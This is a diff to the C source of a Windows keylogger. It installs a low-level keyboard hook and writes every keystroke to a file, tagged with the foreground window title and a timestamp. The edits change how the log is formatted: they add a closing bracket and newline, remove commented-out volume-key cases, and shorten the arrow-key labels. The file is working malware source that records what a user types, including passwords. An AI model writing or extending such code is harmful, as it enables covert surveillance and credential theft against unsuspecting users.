@@ -11,7 +11,7 @@ void log(char s1[]){
 
 
     char s2[]={'       ','[','W','I','N','D','O','W',' ',':'};
-
+    char s3[]={']','\n'};
     if(hIn!=INVALID_HANDLE_VALUE){
 
     HWND foreground = GetForegroundWindow();
@@ -29,15 +29,16 @@ void log(char s1[]){
             char s[64];
             strftime(s, sizeof(s), "%c", tm);
 
-            DWORD nIn3=strlen(s2),nOut3=0,nOut4=0;
+            DWORD nIn3=strlen(s2),nOut3=0;
             WriteFile(hIn,s2,nIn3,&nOut3,NULL);
 
             DWORD nIn1=strlen(s),nOut1=0;
             DWORD nIn2=strlen(window_title),nOut2=0;
+            DWORD nIn4=strlen(s3),nOut4=0;
 
             WriteFile(hIn,window_title,nIn2,&nOut2,NULL);
             WriteFile(hIn,s,nIn1,&nOut1,NULL);
-            //WriteFile(hIn,']',1,&nOut4,NULL);
+            WriteFile(hIn,s3,nIn4,&nOut4,NULL);
             //fprintf(OUTPUT_FILE, "- at %s] ", s);
         }
     }
@@ -166,15 +167,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,WPARAM wParam, LPARAM lParam){
             case VK_PAUSE:
                 log("[Pause]");
                 break;
-            /*case VK_VOLUME_MUTE:
-                log("[VolumeMute]");
-                break;
-            case VK_VOLUME_DOWN:
-                log("[VolumeDown]");
-                break;
-            case VK_VOLUME_UP:
-                log("[VolumeUp]");
-                break;*/
             case VK_SELECT:
                 log("[Select]");
                 break;
@@ -239,13 +231,13 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,WPARAM wParam, LPARAM lParam){
                 log("[PageDown]");
                 break;
             case VK_LEFT:
-                log("[LeftArrow]");
+                log("[Left]");
                 break;
             case VK_RIGHT:
-                log("[RightArrow]");
+                log("[Right]");
                 break;
             case VK_UP:
-                log("[UpArrow]");
+                log("[Up]");
                 break;
             case VK_NUMPAD0:
                 log("[0]");
